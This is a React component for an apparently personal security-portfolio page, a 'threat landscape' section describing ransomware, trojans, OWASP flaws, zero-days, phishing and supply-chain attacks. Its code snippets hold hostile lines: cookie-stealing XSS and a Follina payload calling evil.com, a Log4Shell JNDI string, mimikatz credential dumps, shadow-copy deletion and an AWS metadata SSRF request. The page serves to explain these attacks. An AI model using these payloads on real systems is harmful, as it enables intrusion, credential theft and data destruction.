"use client"

import { ScrollReveal } from "./scroll-reveal"
import { useState } from "react"
import { Shield, AlertTriangle, Bug, Lock, Eye, Zap, FileWarning, Database, Globe } from "lucide-react"

const threats = [
  {
    category: "Ransomware",
    icon: Lock,
    color: "text-red-400",
    borderColor: "hover:border-red-400/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(0_70%_50%/0.08)]",
    description: "Ransomware encrypts victim files and demands payment for decryption keys. Modern variants use double extortion -- encrypting data while also exfiltrating it to threaten public leaks.",
    variants: ["WannaCry", "LockBit", "REvil", "Conti", "BlackCat"],
    code: `# LockBit 3.0 - actual kill chain observed ITW
# Stage 1: Initial access via Citrix Bleed
# CVE-2023-4966 - session token hijack
curl -s https://vpn.target.com/vpn/../vpns/cfg
  → leaks session cookies (no auth needed)

# Stage 2: Disable defenses before encrypt
cmd> vssadmin delete shadows /all /quiet
cmd> wmic shadowcopy delete
cmd> bcdedit /set {default} recoveryenabled No
reg add HKLM\\...\\Windows Defender
  /v DisableAntiSpyware /t REG_DWORD /d 1

# Stage 3: AES-256 + RSA-2048 per-file
for f in walk(drives):
    key = os.urandom(32)  # per-file AES key
    encrypt_AES_CBC(f, key)
    append(rsa_encrypt(key, pub_key), f)
    os.rename(f, f + ".lockbit")

# Stage 4: Double extortion
# "Pay $2M or 4TB hits our leak site"`,
  },
  {
    category: "Trojans",
    icon: Bug,
    color: "text-orange-400",
    borderColor: "hover:border-orange-400/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(30_70%_50%/0.08)]",
    description: "Trojans disguise themselves as legitimate software to infiltrate systems. They can create backdoors, steal credentials, log keystrokes, and give attackers persistent remote access.",
    variants: ["Emotet", "TrickBot", "Agent Tesla", "Remcos RAT", "AsyncRAT"],
    code: `// Emotet → TrickBot → Conti: real chain
// Stage 1: Emotet dropper (macro-less .docx)
// Abuses ms-msdt: (Follina CVE-2022-30190)
<Relationship Type="oleObject"
  Target="mhtml:https://evil.com/payload!x-usc:
  ms-msdt:/id PCWDiagnostic /skip force
  /param \\"IT_LaunchMethod=ContextMenu
  IT_BrowseForFile=$(Invoke-Expression
  (wget https://evil.com/drop.ps1))\\""/>

// Stage 2: TrickBot injects into svchost.exe
NtCreateSection → NtMapViewOfSection
WriteProcessMemory(svchost, shellcode, sz)
NtResumeThread(hThread)  // process hollowing

// Stage 3: Credential harvesting
mimikatz.exe "privilege::debug"
  "sekurlsa::logonpasswords"  // dump LSASS
  "lsadump::dcsync /domain:corp.local
   /user:Administrator"      // DCSync attack

// Stage 4: Cobalt Strike beacon → Conti
beacon> jump psexec64 DC01.corp.local`,
  },
  {
    category: "OWASP Top 10",
    icon: Shield,
    color: "text-primary",
    borderColor: "hover:border-primary/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(162_78%_48%/0.08)]",
    description: "The OWASP Top 10 represents the most critical web application security risks. Understanding each vector is essential for building software that resists real-world attacks.",
    variants: ["Injection", "Broken Auth", "XSS", "SSRF", "Security Misconfiguration"],
    code: `-- A01: Broken Access Control (IDOR)
-- Change orderId to view other user's data
GET /api/orders/10483 → 200 OK (your order)
GET /api/orders/10484 → 200 OK (victim order!)
-- No server-side ownership check

-- A03: SQL Injection → full DB dump
' UNION SELECT username,password,cc_num
  FROM users-- -
-- Dumps entire user table w/ credit cards

-- A07: XSS → session hijack chain
<img src=x onerror="
  var i=new Image();
  i.src='https://evil.com/grab?c='
    +btoa(document.cookie)
    +'&url='+btoa(location.href);
  // Hijacked admin session in 0.3s
">

-- A10: SSRF → AWS metadata steal
GET /proxy?url=http://169.254.169.254
  /latest/meta-data/iam/security-credentials/
-- Returns: AccessKeyId, SecretAccessKey
-- Full AWS account takeover achieved`,
  },
  {
    category: "Zero-Day Exploits",
    icon: Zap,
    color: "text-yellow-400",
    borderColor: "hover:border-yellow-400/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(45_70%_50%/0.08)]",
    description: "Zero-day exploits target unknown vulnerabilities before patches exist. They are weaponized by APT groups and sold on underground markets for millions of dollars.",
    variants: ["Log4Shell", "EternalBlue", "Heartbleed", "Shellshock", "ProxyLogon"],
    code: `# EternalBlue (MS17-010) - NSA's lost weapon
# SMBv1 buffer overflow → remote kernel RCE
# Used by WannaCry to infect 230,000 machines

from impacket import smb
conn = smb.SMB("*SMBSERVER", target_ip)
# Send malformed Trans2 request
# Overflow in srv!SrvOs2FeaListToNt
# Overwrites pool allocation metadata
send_trans2(conn, frag_payload=[
    shellcode_stage1,  # kernel shellcode
    egg_hunter,        # find stage2 in pool
    reverse_shell(LHOST, LPORT)
])
# Result: NT AUTHORITY\\SYSTEM shell
# No credentials needed. No user interaction.

# Log4Shell (CVE-2021-44228) - CVSS 10.0
# One HTTP header = full server compromise
User-Agent: \${jndi:ldap://evil.com/Exploit}
# JNDI forces remote class load → RCE
# 35,000+ Java packages vulnerable at once

# ProxyShell chain (Exchange) → domain admin
# CVE-2021-34473 + 34523 + 31207
# SSRF → auth bypass → post-auth RCE`,
  },
  {
    category: "Social Engineering",
    icon: Eye,
    color: "text-purple-400",
    borderColor: "hover:border-purple-400/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(270_70%_50%/0.08)]",
    description: "Social engineering exploits human psychology rather than technical flaws. Phishing, pretexting, and baiting remain the most effective initial access vectors in modern attacks.",
    variants: ["Spear Phishing", "Vishing", "Baiting", "Pretexting", "Watering Hole"],
    code: `# Real-time MFA bypass with EvilGinx2
# Reverse proxy sits between victim & real site

# 1. Victim clicks: login.microsoft-verify.com
# 2. EvilGinx proxies to real login.microsoft.com
# 3. Victim enters password → proxied to MS
# 4. MS sends MFA push → victim approves
# 5. EvilGinx captures the session cookie
# → Attacker now HAS the authenticated session
# → MFA completely bypassed

# The phishlet config:
sub_filters:
  - {trigger: 'login.microsoftonline.com',
     orig: 'login.microsoftonline.com',
     rewrite: 'login.microsoft-verify.com'}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']

# Stolen tokens → import into browser
# Full access to victim's O365, Teams, OneDrive
# No password change alerts triggered`,
  },
  {
    category: "Supply Chain Attacks",
    icon: Database,
    color: "text-cyan-400",
    borderColor: "hover:border-cyan-400/50",
    glowColor: "hover:shadow-[0_0_30px_hsl(180_70%_50%/0.08)]",
    description: "Supply chain attacks compromise trusted software dependencies or build pipelines to distribute malware at scale. One poisoned package can affect thousands of downstream users.",
    variants: ["SolarWinds", "Codecov", "event-stream", "ua-parser-js", "PyPI Typosquatting"],
    code: `// SolarWinds SUNBURST - the APT of the decade
// Backdoor injected into build pipeline
// Signed DLL shipped to 18,000 orgs

// Inserted into SolarWinds.Orion.Core.dll
class OrionImprovementBusinessLayer {
  // C2 encoded as DNS subdomain queries
  static generateSubdomain(victimId) {
    // Encodes victim org ID in DNS lookup
    return base32(xor(victimId, key))
      + ".appsync-api.us-east-1.avsvmcloud.com"
  }

  // 12-14 day dormancy before activation
  // Checks for security tools first:
  if (processNames.includes("wireshark")
    || processNames.includes("autoruns")
    || services.includes("CrowdStrike"))
      return;  // abort if monitored

  // Only then: beacon → C2 → exfiltrate
  // Compromised: US Treasury, DOJ, FireEye
  // Dwell time: 9 months undetected
}

// npm: event-stream (2018) - 8M weekly DL
// Injected flatmap-stream targeting Copay
// Stole Bitcoin wallets via AES-encrypted
// payload that only ran inside Copay app`,
  },
]

export function ThreatSection() {
  const [activeThreat, setActiveThreat] = useState(0)
  const active = threats[activeThreat]
  const ActiveIcon = active.icon

  return (
    <section id="threats" className="relative py-32 px-6">
      <div className="mx-auto max-w-6xl">
        <ScrollReveal>
          <div className="mb-4 flex items-center gap-3">
            <div className="h-px flex-1 bg-border" />
            <span className="font-mono text-xs text-primary tracking-widest uppercase">
              {"// Threat Landscape"}
            </span>
            <div className="h-px flex-1 bg-border" />
          </div>
          <h2 className="text-center text-3xl md:text-4xl font-bold text-foreground mt-6 mb-4 text-balance">
            The Stuff That Keeps Me Up at Night
          </h2>
          <p className="text-center text-muted-foreground text-sm max-w-lg mx-auto mb-16 leading-relaxed">
            Attack vectors, malware families, and the techniques behind them.
            This is what I spend my free time reading about and pulling apart.
          </p>
        </ScrollReveal>

        {/* Threat category selector */}
        <ScrollReveal delay={100}>
          <div className="flex flex-wrap justify-center gap-2 mb-12">
            {threats.map((threat, i) => {
              const Icon = threat.icon
              return (
                <button
                  key={threat.category}
                  onClick={() => setActiveThreat(i)}
                  className={`inline-flex items-center gap-2 rounded-lg border px-4 py-2.5 font-mono text-xs tracking-wide transition-all duration-300 ${
                    activeThreat === i
                      ? "border-primary bg-primary/10 text-primary shadow-[0_0_20px_hsl(162_78%_48%/0.1)]"
                      : "border-border bg-card text-muted-foreground hover:border-primary/30 hover:text-foreground"
                  }`}
                >
                  <Icon className="h-3.5 w-3.5" />
                  {threat.category}
                </button>
              )
            })}
          </div>
        </ScrollReveal>

        {/* Active threat display */}
        <ScrollReveal delay={200}>
          <div className="grid lg:grid-cols-2 gap-6">
            {/* Info card */}
            <div className={`rounded-lg border border-border bg-card p-6 transition-all duration-300 ${active.borderColor} ${active.glowColor}`}>
              <div className="flex items-center gap-3 mb-4">
                <ActiveIcon className={`h-6 w-6 ${active.color}`} />
                <h3 className="text-xl font-bold text-foreground">{active.category}</h3>
              </div>
              <p className="text-sm text-muted-foreground leading-relaxed mb-6">
                {active.description}
              </p>
              <div>
                <h4 className="font-mono text-xs text-primary tracking-widest uppercase mb-3 flex items-center gap-2">
                  <AlertTriangle className="h-3 w-3" />
                  Known Variants & Examples
                </h4>
                <div className="flex flex-wrap gap-2">
                  {active.variants.map((v) => (
                    <span
                      key={v}
                      className={`inline-block rounded-md border border-border bg-secondary px-3 py-1.5 font-mono text-[11px] text-secondary-foreground`}
                    >
                      {v}
                    </span>
                  ))}
                </div>
              </div>

              {/* Threat severity indicator */}
              <div className="mt-6 pt-6 border-t border-border">
                <div className="flex items-center justify-between mb-2">
                  <span className="font-mono text-xs text-muted-foreground">Threat Severity</span>
                  <span className={`font-mono text-xs font-bold ${active.color}`}>CRITICAL</span>
                </div>
                <div className="h-1.5 w-full rounded-full bg-secondary overflow-hidden">
                  <div
                    className="h-full rounded-full transition-all duration-700 ease-out"
                    style={{
                      width: "92%",
                      background: `linear-gradient(90deg, hsl(162, 78%, 48%), hsl(0, 70%, 50%))`,
                      boxShadow: "0 0 8px hsl(0 70% 50% / 0.4)",
                    }}
                  />
                </div>
              </div>
            </div>

            {/* Code terminal */}
            <div className="rounded-lg border border-border bg-card overflow-hidden transition-all duration-300">
              <div className="flex items-center gap-2 border-b border-border px-4 py-3 bg-secondary/50">
                <span className="h-2.5 w-2.5 rounded-full bg-destructive/70" />
                <span className="h-2.5 w-2.5 rounded-full bg-yellow-500/70" />
                <span className="h-2.5 w-2.5 rounded-full bg-green-500/70" />
                <span className="ml-3 font-mono text-[10px] text-muted-foreground tracking-wider">
                  {active.category.toLowerCase().replace(/\s+/g, "_")}_analysis.py
                </span>
              </div>
              <div className="p-5 overflow-x-auto">
                <pre className="font-mono text-[11px] leading-relaxed text-muted-foreground whitespace-pre">
                  {active.code.split("\n").map((line, li) => {
                    const isComment = line.trimStart().startsWith("#") || line.trimStart().startsWith("//") || line.trimStart().startsWith("--")
                    const hasKeyword = /\b(def|class|import|from|return|if|else|for|const|let|var|function|SELECT|FROM|WHERE|AND|GET|POST)\b/.test(line)
                    const hasString = /(["'`])(?:(?=(\\?))\2.)*?\1/.test(line)
                    return (
                      <span key={li} className="block">
                        <span className="inline-block w-6 text-right mr-4 text-muted-foreground/30 select-none">{li + 1}</span>
                        <span className={
                          isComment ? "text-muted-foreground/50 italic" :
                          hasKeyword ? "text-primary" :
                          hasString ? "text-foreground/80" :
                          "text-foreground/70"
                        }>
                          {line}
                        </span>
                      </span>
                    )
                  })}
                </pre>
              </div>
            </div>
          </div>
        </ScrollReveal>
      </div>
    </section>
  )
}
